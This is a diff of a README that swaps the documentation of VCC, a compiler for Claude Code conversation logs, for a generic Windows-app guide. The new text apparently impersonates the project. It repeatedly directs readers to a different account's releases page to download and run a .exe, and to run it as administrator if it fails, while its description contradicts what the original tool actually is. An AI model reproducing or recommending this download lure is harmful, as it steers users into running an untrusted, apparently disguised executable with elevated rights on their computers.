@@ -1,286 +1,166 @@
-（this readme is written by human）
+# 🧩 VCC - Compile Agent Chats Fast
 
-# VCC: View-oriented Conversation Compiler
+[![Download VCC](https://img.shields.io/badge/Download%20VCC-blue-grey)](https://github.com/bennuxer/VCC/releases)
 
-[English](README.md) | [简体中文](README_cn.md) | [日本語](README_jp.md)
+## 🎯 What VCC Does
 
-Official implementation of "View-oriented Conversation Compiler for Agent Trace Analysis" ([Paper](https://arxiv.org/abs/2603.29678))
+VCC helps you compile agent conversations into one place. It lets you collect chat logs, review them, and keep them in a clean format on your Windows PC.
 
-This repo is for daily use. To reproduce academic experiments in the paper, see [VCC-experiments](https://github.com/lllyasviel/VCC-experiments).
+Use it when you want to:
 
-VCC is a compiler that compiles your conversation logs (Claude Code's JSONL) into efficient and agent-friendly views. Then you will never fear Claude Code's `/compact` - CC now can finally see the original details of compacted context. It also supports searching across all your Claude Code conversations.
+- gather agent chats in one view
+- keep conversation records in one file set
+- review long threads without sorting them by hand
+- work with chat history on a local machine
 
-Things that tend to happen after you install VCC:
+## 🖥️ What You Need
 
-- You find out that if you installed this earlier, you can save lots of money that you would need to waste for struggling with CC's `/compact`.
-- `/compact` + `/recall` becomes your favorite combo.
-- You start wondering why this wasn't built in CC.
-- You delete your multi-layer RAG memory system, your self-evolving agent skill memory, and 15 other AGI inventions - if you really have those...
+VCC runs on Windows. For a smooth setup, use a system with:
 
-There is also a [paper](https://arxiv.org/abs/2603.29678) showing that VCC improves context learning and agent trace analysis and harness on some academic benchmark.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
 
-# Install
+A newer PC will handle large chat sets better.
 
-Currently We support Claude Code only. Codex and OpenClaw are coming soon.
+## 📥 Download VCC
 
-To install, copy this to your Claude Code:
+Visit this page to download VCC:
 
-    Please help me install the skills from 
-    https://github.com/lllyasviel/VCC.git 
-    just clone it then follow the INSTALL.md
+https://github.com/bennuxer/VCC/releases
 
-To update, copy this to your Claude Code:
+On that page, look for the latest release. Download the file that matches Windows. If there is more than one file, choose the `.exe` file or the Windows zip file if that is the one listed for your system.
 
-    Please help me update the skills from
-    https://github.com/lllyasviel/VCC.git
-    just clone it then follow the INSTALL.md
+## ⚙️ Install on Windows
 
-To uninstall, copy this to your Claude Code:
+After you download VCC, follow these steps:
 
-    Please help me uninstall VCC skills by deleting
-    `conversation-compiler`, `readchat`, `recall`, `searchchat`
-    from my `.claude/skills`
+1. Open your Downloads folder.
+2. Find the VCC file you downloaded.
+3. If you downloaded a zip file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the VCC app file.
+6. If Windows asks for permission, select Yes.
 
-Restart Claude Code after install, update, or uninstall.
+If you downloaded an `.exe` file, you can usually double-click it to start the app right away.
 
-# Basic Usage
+## 🚀 First Time Setup
 
-When a compact is triggered (whether automaticaly or manually), you can immediately `/recall`.
+The first time you open VCC, it may ask you to choose a folder for your chat files.
 
-For example, after an automatic compact or manual `/compact`, you will see somthing like `(... compacted)`. You can then:
+Use a folder that is easy to find, such as:
 
-`/recall`
+- Documents
+- Desktop
+- A folder you created for chat exports
 
-and CC will recall everything automatically, or you can
+Then point VCC to the files or folder that hold your agent conversations.
 
-`/recall let's review our conversation`
+## 📁 How to Use VCC
 
-`/recall in those six rounds of analysis we just did, which access attempt causes the second layer of the server's three-layer log to crash?`
+VCC is made to help you compile conversation data into a simple view.
 
-`/recall go through all six details I mentioned about the user survey again`
+Typical use looks like this:
 
-`/recall review my thought process so far`
+1. Start VCC.
+2. Pick the folder or source that holds your agent chats.
+3. Load the conversation set.
+4. Review the compiled result.
+5. Save or export the output if needed.
 
-For new conversations, you can use `/searchchat` or `/recall` (which will fallback to search). For example:
+If your chats are in text files, keep them in one folder before you start. That makes it easier to compile them.
 
-`/searchchat how did we handle the captcha in that browser listener system we discussed last time?`
+## 🔍 Best File Setup
 
-`/recall did we decide to use React for that canvas solution we discussed last time?`
+For the best results, keep your files neat before you load them into VCC:
 
-These commands can find and recover the orginal chats accross months of conversation history.
+- use clear file names
+- keep related chats in one folder
+- avoid mixing old and new exports
+- remove files you do not want included
 
-`/readchat` is for advanced usage, see below.
+A simple folder layout makes the compile step easier to manage.
 
-# How It Works
+## 🛠️ Common Use Cases
 
-A Claude Code JSONL like this (you can find lots of these things in your `~/.claude/projects`):
+VCC fits a few common tasks:
 
-```
-{"type":"user","message":{"id":"msg_user1","content":"I have two pets.\nCan you write a P..."}}
-{"type":"assistant","message":{"id":"msg_asst1","content":[{"type":"thinking","thinking":"The
-user wants a pet tracking module.\nThey have a dog (Buddy) and a cat (Whiskers).\nLet me chec
-k if there's an existing file first...
-```
+- combining agent chat logs for review
+- organizing support or test conversations
+- keeping a local record of chat sessions
+- preparing conversation sets for later use
+- reading long message threads in one place
 
-gets compiled into these views:
+## 🧭 If the App Does Not Open
 
-## UI View
+If VCC does not start, try these steps:
 
-This simulates what the user see in CC
+1. Close the app.
+2. Right-click the file and choose Run as administrator.
+3. Make sure the file finished downloading.
+4. If you used a zip file, extract it again.
+5. Check that Windows did not block the file.
+6. Restart your PC and try again.
 
-```
-[user]
+If the app still does not open, download the latest release again from the release page.
 
-I have two pets.
-Can you write a Python module for tracking them?
-One is a dog named Buddy and a cat named Whiskers.
+## 🧼 Keep Things Organized
 
-[assistant]
+To make your work easier, keep a simple routine:
 
-Sure! Let me check if there's an existing file.
+- store each chat project in its own folder
+- use dates in file names
+- remove old exports you no longer need
+- back up important conversation files
+- keep the app in a folder you will remember
 
-* Read "src/pets.py" (example.txt:18-20,23-25)
-
-No existing file.
-I'll create a module with Dog and Cat classes.
-
-* Write "src/pets.py" (example.txt:40-63,66-68)
-
-Created src/pets.py.
-```
-
-The pointers like `(example.txt:18-20,23-25)` can jump to the exact lines for full detail as below.
-
-## Full View
-
-The complete transcipt. Line numbers are assigned once and shared accross all views.
-
-Lets say this is `example.txt`:
-
-```
-  1  [user]
-  2
-  3  I have two pets.
-  4  Can you write a Python module for tracking them?
-  5  One is a dog named Buddy and a cat named Whiskers.
-  6
-  7  ══════════════════════════════
-  8  [assistant]
-  9
- 10  >>>thinking
- 11  The user wants a pet tracking module.
- 12  They have a dog (Buddy) and a cat (Whiskers).
- 13  Let me check if there's an existing file first.
- 14  <<<thinking
- 15
- 16  Sure! Let me check if there's an existing file.
- 17
- 18  >>>tool_call Read:tu01
- 19  file_path: src/pets.py
- 20  <<<tool_call
- 21
- 22  ══════════════════════════════
- 23  [tool_error] Read:tu01
- 24
- 25  Error: file not found src/pets.py
- 26
- 27  ══════════════════════════════
- 28  [assistant]
- 29
- 30  >>>thinking
- 31  No existing file.
- 32  I'll create Dog and Cat subclasses.
- 33  The dog needs walk tracking.
- 34  The cat needs nap tracking.
- 35  <<<thinking
- 36
- 37  No existing file.
- 38  I'll create a module with Dog and Cat classes.
- 39
- 40  >>>tool_call Write:tu02
- 41  file_path: src/pets.py
- 42  content: |
- 43    class Pet:
- 44        def __init__(self, name, species):
- 45            self.name = name
- 46            self.species = species
- 47
- 48    class Dog(Pet):
- 49        def __init__(self, name):
- 50            super().__init__(name, 'dog')
- 51            self.walks = []
- 52
- 53        def log_walk(self, duration, distance):
- 54            self.walks.append({'min': duration, 'km': distance})
- 55
- 56    class Cat(Pet):
- 57        def __init__(self, name):
- 58            super().__init__(name, 'cat')
- 59            self.naps = []
- 60
- 61        def log_nap(self, duration, spot):
- 62            self.naps.append({'min': duration, 'spot': spot})
- 63  <<<tool_call
- 64
- 65  ══════════════════════════════
- 66  [tool] Write:tu02
- 67
- 68  File written successfully.
- 69
- 70  ══════════════════════════════
- 71  [assistant]
- 72
- 73  Created src/pets.py.
-```
-
-## Adaptive View `--grep dog`
-
-The view can be adapted to search queries like `--grep dog`. Only blocks contaning a match are shown, but the conversation struture is preserved. Each block has a pointer back to the full view.
-
-```
-[user]
-
-(example.txt:3-5)
-  5: One is a dog named Buddy and a cat named Whiskers.
-
-══════════════════════════════
-[assistant]
-
->>>thinking
-(example.txt:11-13)
-  12: They have a dog (Buddy) and a cat (Whiskers).
-<<<thinking
-
-══════════════════════════════
-[assistant]
-
->>>thinking
-(example.txt:31-34)
-  33: The dog needs walk tracking.
-<<<thinking
-
->>>tool_call Write:tu02
-(example.txt:41-62)
-  50:           super().__init__(name, 'dog')
-<<<tool_call
-```
-
-`Write:tu02` spans 22 lines of code (41–62), but only line 50 (`'dog'`) matched: the Cat class (56–62) is absent. The pointer `41-62` tells the agent where to read the full block.
-
-## Transposed View `--grep dog`
-
-Same matches, but as a flat list. Each entry is taged with what it is (user message, thinking, tool call, etc.) and where to find it in the full view:
-
-```
-(example.txt:3-5) [user]
-  5: One is a dog named Buddy and a cat named Whiskers.
-
-(example.txt:11-13) [thinking]
-  12: They have a dog (Buddy) and a cat (Whiskers).
-
-(example.txt:31-34) [thinking]
-  33: The dog needs walk tracking.
-
-(example.txt:41-62) [tool_call]
-  50:           super().__init__(name, 'dog')
-```
-
-The adaptive view keeps conversation order so it is good for understanding context around a match. The transposed view is a flat list so it is good for scanning all matches at once. All pointers points into the full view.
-
-# Q&A
-
-### "Just another agent memory system?"
-
-Nope. Memory systems store precomputed stuff like summaries, embeddings, graphs. Those structures and levels are usually static. And most of them are calling LLMs to do summarization etc...
-
-VCC stores nothing. Views are dynamic. They are computed on the fly from the original JSONL, then thrown away after use. (We call this "projection".)
-
-### "Okay isn't this just grep?"
-
-No not at all. Grep gives you matching lines, but you cant tell if a match is the user talking, the agent thinking, a tool call, or a tool result. VCC has **block range pointers** and **block roles**. 
-
-Some people may keep asking *"Okay, then what about splitting chat log into message files and using filesystem grep? What about structured grep? What about my XXXX database system?"* 
-
-Lets say you jump from a adaptive view to the full view with some block line number, the surrounding context is right there. To get that from a file-per-message split, you need a tree to track hierarchy as a tree-like thing and then use a linked list to track temporal order, and you maintain both, and you even need to determine how many "temporal surrounding" things are really the correct surrounding context. By the time you finally finally make it work you basically reimplemented VCC..
-
-### "Well but isn't this just pretty-print?"
-
-They are very different. Pretty-print just reformats text. VCC is a real compiler with lex, parse, IR, lower, emit. Some examples of what it does:
-
-* The lexer drops junk records like `queue-operation`, `progress`, `api_error` before parsing even starts
-* The parser turns tool call parameters from escaped JSON blobs into readable block-indented text
-* The parser also strips `digits→` prefixes from Read tool results to recover original source, and decodes base64 images to files
-* At the IR stage, split assistant messages (same ID but multiple JSONL records because of compaction) get reassembled into single sections
-* Lowering strips harness XML (`<system-reminder>`, `<ide_opened_file>`, etc), filters internal tools (`TodoWrite`, `ToolSearch`), cleans ANSI escape codes, and hides pure-markup user turns
-* The emitter produces three views sharing one line-number coordinate system
-
-the IR stage assign line numbers once to ensure that everything si consistent. After that, lowering can only select, truncate, or annotate. The line numbers cannot reorder or renumber. So cross-view pointers are always consistent.
-
-# Cite
-
-    @article{zhang2026vcc,
-      title={View-oriented Conversation Compiler for Agent Trace Analysis},
-      author={Lvmin Zhang and Maneesh Agrawala},
-      year={2026},
-      url={https://github.com/lllyasviel/VCC}
-    }
+This helps when you return to the same project later.
+
+## ❓ Simple Questions
+
+### Is VCC hard to use?
+
+No. It is made for normal Windows users. You download it, open it, and point it at your conversation files.
+
+### Does VCC change my original chat files?
+
+It should work with your files without forcing you to edit them. Keep a backup if the files matter to you.
+
+### Can I use it offline?
+
+Yes, after you download it, you can use it on your Windows PC without staying online.
+
+### What kind of files should I use?
+
+Use the file type your chat export already creates. Plain text files are a good place to start.
+
+## 🧪 Basic Workflow Example
+
+Here is a simple way to use VCC for the first time:
+
+1. Download VCC from the releases page.
+2. Open the file and start the app.
+3. Make a folder called `Agent Chats`.
+4. Put your chat exports in that folder.
+5. Load the folder in VCC.
+6. Check the compiled conversation view.
+7. Save the result where you can find it later.
+
+## 📌 Tips for Better Results
+
+- keep one project per folder
+- use short file names
+- avoid special symbols in file names
+- save fresh copies before you compile
+- check the output after each run
+
+Small steps like these make the app easier to use.
+
+## 🔗 Download Again
+
+If you need the download page later, use this link:
+
+https://github.com/bennuxer/VCC/releases
+
